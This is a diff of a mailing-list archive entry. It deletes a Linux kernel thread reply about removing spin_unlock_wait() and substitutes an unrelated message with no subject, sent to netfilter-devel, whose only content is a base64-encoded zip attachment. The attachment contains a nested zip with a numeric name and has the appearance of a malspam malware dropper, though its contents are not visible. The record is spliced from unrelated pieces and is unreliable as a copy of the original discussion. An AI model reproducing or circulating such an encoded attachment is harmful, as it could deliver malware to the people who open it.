@@ -1,84 +1,94 @@
-From: "Paul E. McKenney" <paulmck@linux.vnet.ibm.com>
-Subject: Re: [PATCH v2 0/9] Remove spin_unlock_wait()
-Date: Thu, 6 Jul 2017 10:29:16 -0700
-Message-ID: <20170706172916.GK2393@linux.vnet.ibm.com>
-References: <20170629235918.GA6445@linux.vnet.ibm.com>
- <20170705232955.GA15992@linux.vnet.ibm.com>
- <063D6719AE5E284EB5DD2968C1650D6DD0033F01@AcuExch.aculab.com>
- <20170706160555.xc63yydk77gmttae@hirez.programming.kicks-ass.net>
- <20170706162024.GD2393@linux.vnet.ibm.com>
- <20170706165036.v4u5rbz56si4emw5@hirez.programming.kicks-ass.net>
- <20170706170850.GI15574@arm.com>
-Reply-To: paulmck@linux.vnet.ibm.com
+From: <simon.a.t.hardy@gmail.com>
+Subject: (unknown)
+Date: Thu, 06 Jul 2017 17:35:54 -0000
+Message-ID: <149936255449.4332.9940197378651050222@deu.edu.tr>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: Peter Zijlstra <peterz@infradead.org>,
-        David Laight <David.Laight@ACULAB.COM>,
-        "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
-        "netfilter-devel@vger.kernel.org" <netfilter-devel@vger.kernel.org>,
-        "netdev@vger.kernel.org" <netdev@vger.kernel.org>,
-        "oleg@redhat.com" <oleg@redhat.com>,
-        "akpm@linux-foundation.org" <akpm@linux-foundation.org>,
-        "mingo@redhat.com" <mingo@redhat.com>,
-        "dave@stgolabs.net" <dave@stgolabs.net>,
-        "manfred@colorfullife.com" <manfred@colorfullife.com>,
-        "tj@kernel.org" <tj@kernel.org>, "arnd@arndb.de" <arnd@arndb.de>,
-        "linux-arch@vger.kernel.org" <linux-arch@vger.kernel.org>,
-        "stern@rowland.harvard.edu" <stern@rowland.harvard.edu>,
-        "parri.andrea@gmail.com" <parri.andrea@gmail.com>,
-        "torvalds@linux-foundation.org" <torvalds@linux-foundation.o
-To: Will Deacon <will.deacon@arm.com>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <20170706170850.GI15574@arm.com>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netfilter-devel.vger.kernel.org
+Content-Type: application/zip; name="EMAIL_7662351347_netfilter-devel.zip"
+Content-Transfer-Encoding: base64
+To: <netfilter-devel@vger.kernel.org>
+Return-path: <netfilter-devel-owner@vger.kernel.org>
+Received: from katalog.adm.deu.edu.tr ([193.140.151.4]:44990 "HELO deu.edu.tr"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751654AbdGFRgA (ORCPT <rfc822;netfilter-devel@vger.kernel.org>);
+        Thu, 6 Jul 2017 13:36:00 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: netfilter-devel-owner@vger.kernel.org
+List-ID: <netfilter-devel.vger.kernel.org>
 
-On Thu, Jul 06, 2017 at 06:08:50PM +0100, Will Deacon wrote:
-> On Thu, Jul 06, 2017 at 06:50:36PM +0200, Peter Zijlstra wrote:
-> > On Thu, Jul 06, 2017 at 09:20:24AM -0700, Paul E. McKenney wrote:
-> > > On Thu, Jul 06, 2017 at 06:05:55PM +0200, Peter Zijlstra wrote:
-> > > > On Thu, Jul 06, 2017 at 02:12:24PM +0000, David Laight wrote:
-> > > > > From: Paul E. McKenney
-> > > 
-> > > [ . . . ]
-> > > 
-> > > > Now on the one hand I feel like Oleg that it would be a shame to loose
-> > > > the optimization, OTOH this thing is really really tricky to use,
-> > > > and has lead to a number of bugs already.
-> > > 
-> > > I do agree, it is a bit sad to see these optimizations go.  So, should
-> > > this make mainline, I will be tagging the commits that spin_unlock_wait()
-> > > so that they can be easily reverted should someone come up with good
-> > > semantics and a compelling use case with compelling performance benefits.
-> > 
-> > Ha!, but what would constitute 'good semantics' ?
-> > 
-> > The current thing is something along the lines of:
-> > 
-> >   "Waits for the currently observed critical section
-> >    to complete with ACQUIRE ordering such that it will observe
-> >    whatever state was left by said critical section."
-> > 
-> > With the 'obvious' benefit of limited interference on those actually
-> > wanting to acquire the lock, and a shorter wait time on our side too,
-> > since we only need to wait for completion of the current section, and
-> > not for however many contender are before us.
-> > 
-> > Not sure I have an actual (micro) benchmark that shows a difference
-> > though.
-> > 
-> > 
-> > 
-> > Is this all good enough to retain the thing, I dunno. Like I said, I'm
-> > conflicted on the whole thing. On the one hand its a nice optimization,
-> > on the other hand I don't want to have to keep fixing these bugs.
-> 
-> As I've said, I'd be keen to see us drop this and bring it back if/when we
-> get a compelling use-case along with performance numbers. At that point,
-> we'd be in a better position to define the semantics anyway, knowing what
-> exactly is expected by the use-case.
-
-Hear, hear!!!  ;-)
-
-							Thanx, Paul
+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
+EAAAAAA=
